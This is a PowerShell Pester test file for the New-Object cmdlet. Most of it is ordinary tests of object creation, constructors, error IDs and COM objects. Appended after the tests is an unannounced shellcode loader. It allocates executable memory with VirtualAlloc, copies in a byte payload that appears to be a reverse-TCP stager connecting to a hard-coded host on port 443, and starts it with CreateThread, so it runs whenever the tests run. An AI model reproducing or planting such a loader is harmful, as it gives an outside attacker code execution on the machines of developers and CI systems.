

Describe "New-Object" -Tags "CI" {
    It "Support 'ComObject' parameter on platforms" {
        if ($IsLinux -or $IsMacOs ) {
            { New-Object -ComObject "Shell.Application" } | Should -Throw -ErrorId "NamedParameterNotFound,Microsoft.PowerShell.Commands.NewObjectCommand"
        } else {
            
            (Get-Command "New-Object").Parameters.ContainsKey("ComObject") | Should -BeTrue
        }
    }

    It "should create an object with 4 fields" {
        $o = New-Object psobject
        $val = $o.GetType()

        $val.IsPublic       | Should -Not -BeNullOrEmpty
        $val.Name           | Should -Not -BeNullOrEmpty
        $val.IsSerializable | Should -Not -BeNullOrEmpty
        $val.BaseType       | Should -Not -BeNullOrEmpty

        $val.IsPublic       | Should -BeTrue
        $val.IsSerializable | Should -BeFalse
        $val.Name           | Should -Be 'PSCustomObject'
        $val.BaseType       | Should -Be 'System.Object'
    }

    It "should create an object with using Property switch" {
        $hash = @{
            FirstVal = 'test1'
            SecondVal = 'test2'
        }
        $o = New-Object psobject -Property $hash

        $o.FirstVal     | Should -Be 'test1'
        $o.SecondVal    | Should -Be 'test2'
    }

    It "should create a .Net object with using ArgumentList switch" {
        $o = New-Object -TypeName System.Version -ArgumentList "1.2.3.4"
        $o.GetType() | Should -Be ([System.Version])

        $o      | Should -BeExactly "1.2.3.4"
    }
}

Describe "New-Object DRT basic functionality" -Tags "CI" {
    It "New-Object with int array should work"{
        $result = New-Object -TypeName int[] -Arg 10
        $result.Count | Should -Be 10
    }

    It "New-Object with char should work"{
        $result = New-Object -TypeName char
        $result.Count | Should -Be 1
        $defaultChar = [char]0
        ([char]$result) | Should -Be $defaultChar
    }

    It "New-Object with default Coordinates should work"{
        $result = New-Object -TypeName System.Management.Automation.Host.Coordinates
        $result.Count | Should -Be 1
        $result.X | Should -Be 0
        $result.Y | Should -Be 0
    }

    It "New-Object with specified Coordinates should work"{
        $result = New-Object -TypeName System.Management.Automation.Host.Coordinates -ArgumentList 1,2
        $result.Count | Should -Be 1
        $result.X | Should -Be 1
        $result.Y | Should -Be 2
    }

    It "New-Object with Employ should work"{
        if(-not ([System.Management.Automation.PSTypeName]'Employee').Type)
        {
            Add-Type -TypeDefinition "public class Employee{public Employee(string firstName,string lastName,int yearsInMS){FirstName = firstName;LastName=lastName;YearsInMS = yearsInMS;}public string FirstName;public string LastName;public int YearsInMS;}"
        }
        $result = New-Object -TypeName Employee -ArgumentList "Mary", "Soe", 11
        $result.Count | Should -Be 1
        $result.FirstName | Should -BeExactly "Mary"
        $result.LastName | Should -BeExactly "Soe"
        $result.YearsInMS | Should -Be 11
    }

    It "New-Object with invalid type should throw Exception"{
        $e = { New-Object -TypeName LiarType -ErrorAction Stop } | Should -Throw -ErrorId "TypeNotFound,Microsoft.PowerShell.Commands.NewObjectCommand" -PassThru
        $e.CategoryInfo | Should -Match "PSArgumentException"
    }

    It "New-Object with invalid argument should throw Exception"{
        $e = { New-Object -TypeName System.Management.Automation.PSVariable -ArgumentList "A", 1, None, "asd" -ErrorAction Stop } |
	        Should -Throw -ErrorId "ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand" -PassThru
        $e.CategoryInfo | Should -Match "MethodException"
    }

    It "New-Object with abstract class should throw Exception"{
        Add-Type -TypeDefinition "public abstract class AbstractEmployee{public AbstractEmployee(){}}"
        $e = { New-Object -TypeName AbstractEmployee -ErrorAction Stop } |
		Should -Throw -ErrorId "ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand" -PassThru
        $e.CategoryInfo | Should -Match "MethodInvocationException"
    }

    It "New-Object with bad argument for class constructor should throw Exception"{
        if(-not ([System.Management.Automation.PSTypeName]'Employee').Type)
        {
            Add-Type -TypeDefinition "public class Employee{public Employee(string firstName,string lastName,int yearsInMS){FirstName = firstName;LastName=lastName;YearsInMS = yearsInMS;}public string FirstName;public string LastName;public int YearsInMS;}"
        }
        $e = { New-Object -TypeName Employee -ArgumentList 11 -ErrorAction Stop } | Should -Throw -ErrorId "ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand" -PassThru
        $e.CategoryInfo | Should -Match "MethodException"
    }

    
    It "New-Object with not init class constructor should throw Exception" -Pending{
        if(-not ([System.Management.Automation.PSTypeName]'Employee').Type)
        {
           Add-Type -TypeDefinition "public class Employee{public Employee(string firstName,string lastName,int yearsInMS){FirstName = firstName;LastName=lastName;YearsInMS = yearsInMS;}public string FirstName;public string LastName;public int YearsInMS;}"
        }
        { New-Object -TypeName Employee -ErrorAction Stop } | Should -Throw -ErrorId "CannotFindAppropriateCtor,Microsoft.PowerShell.Commands.NewObjectCommand"
    }

    It "New-Object with Private Nested class should throw Exception"{
        Add-Type -TypeDefinition "public class WeirdEmployee{public WeirdEmployee(){}private class PrivateNestedWeirdEmployee{public PrivateNestedWeirdEmployee(){}}}"
        $e = { New-Object -TypeName WeirdEmployee+PrivateNestedWeirdEmployee -ErrorAction Stop } | Should -Throw -ErrorId "TypeNotFound,Microsoft.PowerShell.Commands.NewObjectCommand" -PassThru
        $e.CategoryInfo | Should -Match "PSArgumentException"
    }

    It "New-Object with TypeName and Property parameter should work"{
        $result = New-Object -TypeName PSObject -property @{foo=123}
        $result.foo | Should -Be 123
    }
}

try
{
    $defaultParamValues = $PSdefaultParameterValues.Clone()
    $PSDefaultParameterValues["it:skip"] = ![System.Management.Automation.Platform]::IsWindowsDesktop

    Describe "New-Object COM functionality" -Tags "CI" {
        $testCases = @(
            @{
                Name   = 'Microsoft.Update.AutoUpdate'
                Property = 'Settings'
                Type = 'Object'
            }
            @{
                Name   = 'Microsoft.Update.SystemInfo'
                Property = 'RebootRequired'
                Type = 'Bool'
            }
        )

        It "Should be able to create <Name> with property <Property> of Type <Type>" -TestCases $testCases {
            param($Name, $Property, $Type)
            $comObject = New-Object -ComObject $name
            $comObject.$Property | Should -Not -BeNullOrEmpty
            $comObject.$Property | Should -Beoftype $Type
        }

        It "Should fail with correct error when creating a COM object that dose not exist" {
            {New-Object -ComObject 'doesnotexist'} | Should -Throw -ErrorId 'NoCOMClassIdentified,Microsoft.PowerShell.Commands.NewObjectCommand'
        }
    }
}
finally
{
    $global:PSdefaultParameterValues = $defaultParamValues
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc2,0x59,0x2f,0x3c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

